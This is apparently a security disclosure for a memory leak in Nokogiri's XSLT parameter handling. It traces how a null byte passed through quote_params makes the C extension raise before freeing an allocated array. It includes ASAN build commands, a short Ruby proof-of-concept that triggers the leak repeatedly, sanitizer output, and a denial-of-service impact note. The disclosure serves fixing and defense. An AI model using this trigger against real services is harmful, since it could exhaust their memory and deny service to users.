
TIME Line


Summary

`Nokogiri::XSLT.quote_params` does not sanitize null bytes in parameter values.  
When a null byte is present, `StringValueCStr` raises an `ArgumentError` mid-execution after `ruby_xcalloc` has already allocated the `params` array in `rb_xslt_stylesheet_transform`. Because the exception propagates via `longjmp`, `ruby_xfree(params)` is never reached, resulting in a memory leak confirmed by AddressSanitizer LeakSanitizer.

---

Details

Root Cause 1 - quote_params does not handle null bytes

`lib/nokogiri/xslt.rb:103~113`

```rb
  def quote_params(params)
    params.flatten.each_slice(2).with_object([]) do |kv, quoted_params|
      key, value = kv.map(&:to_s)
      value = if value.include?("'")
        "concat('#{value.gsub("'", %q{', "'", '})}')"
      else
        "'#{value}'"  # null byte passes through unhandled
      end
      quoted_params << key
      quoted_params << value
    end
  end
```


A value containing a null byte (e.g. "val\x00ue") passes through quote_params unchanged, producing "'val\x00ue'".

Root Cause 2 - params array allocated before null byte is detected

`ext/nokogiri/xslt_stylesheet.c:279~302`

// line 279: params array allocated
params = ruby_xcalloc((size_t)param_len + 1, sizeof(char *));

for (j = 0; j < param_len; j++) {
  VALUE entry = rb_ary_entry(rb_param, j);
  const char *ptr = StringValueCStr(entry);  // line 282: raises ArgumentError on null byte
  params[j] = ptr;
}

// ...
ruby_xfree(params);  // line 302: never reached due to longjmp exception propagation

`ruby_xcalloc` allocates the `params` array at line 279. When `StringValueCStr` encounters a null byte at line 282, it calls `rb_raise`, which unwinds the stack via `longjmp`. `ruby_xfree(params)` at line 302 is never reached, leaking the allocated memory on every call.

---

Environment setup:

```
Build Nokogiri extension with ASAN
cd ext/nokogiri
rm -f Makefile *.so *.o

CC=clang \
  CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  LDFLAGS="-fsanitize=address" \
  ruby extconf.rb --use-system-libraries

make -j$(nproc)
mkdir -p ../../lib/nokogiri/3.2
cp nokogiri.so ../../lib/nokogiri/3.2/nokogiri.so
cd ../..
```

PoC script (poc.rb):

```

```
require "nokogiri"
  xsl = Nokogiri::XSLT.parse(<<~XSL)
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0"
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:param name="p"/>
      <xsl:template match="/"><r><xsl:value-of select="$p"/></r></xsl:template>
    </xsl:stylesheet>
  XSL

  doc = Nokogiri::XML("<root/>")

  100.times do
    begin
      xsl.transform(doc, Nokogiri::XSLT.quote_params(["p", "val\x00ue"]))
    rescue ArgumentError
    end
  end

Run with LeakSanitizer:

export ASAN_LIB=$(ls /usr/lib/x86_64-linux-gnu/libasan.so.* | sort -V | tail -1)
export LD_PRELOAD="$ASAN_LIB"
export ASAN_OPTIONS="detect_leaks=1:halt_on_error=0:print_stacktrace=1"

PoC trigger

ruby -I lib poc.rb 2>&1 | grep -B 15 "xslt_stylesheet.c:282"

LeakSanitizer output:

 ```
 #28 0x7fb3498071be  (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x1d31be) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #29 0x7fb3498076b9  (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x1d36b9) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)

Indirect leak of 16 byte(s) in 1 object(s) allocated from:
    #0 0x7fb349af69c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x7fb34970c87c  (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0xd887c) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #2 0x7fb349873b6a  (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x23fb6a) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #3 0x7fb34987d3d1  (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x2493d1) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #4 0x7fb349892d22  (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x25ed22) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #5 0x7fb34989370e in rb_funcallv_kw (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x25f70e) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #6 0x7fb34977d1d3 in rb_class_new_instance_kw (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x1491d3) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #7 0x7fb3496e3051 in rb_exc_new_str (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0xaf051) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #8 0x7fb3496e41a5  (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0xb01a5) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #9 0x7fb3496e4249 in rb_raise (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0xb0249) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #10 0x7fb34982aa1d in rb_string_value_cstr (/lib/x86_64-linux-gnu/libruby-3.2.so.3.2+0x1f6a1d) (BuildId: 6779c9503230ead2109f565003bd61c714adb5e4)
    #11 0x7fb341ec554e in rb_xslt_stylesheet_transform /home/jack/vr/nokogiri/ext/nokogiri/xslt_stylesheet.c:282
```

---

Impact

Any application that passes user-supplied input through `Nokogiri::XSLT.quote_params` and then calls `Stylesheet#transform` is affected.  
An attacker who can inject a null byte into a parameter value triggers a memory leak on every request. In long-running processes or under repeated requests, this can lead to unbounded memory growth and eventual denial of service.

Note that this affects the recommended safe usage path (quote_params is Nokogiri's own provided safety mechanism). The leak occurs even when the developer follows Nokogiri's documented API correctly.

```
ext/nokogiri/xslt_stylesheet.c:212~214
// *Example* using the XSLT.quote_params helper method to safely quote-escape strings:
//
// stylesheet.transform(doc, Nokogiri::XSLT.quote_params({ "title" => "Aaron's List" }
```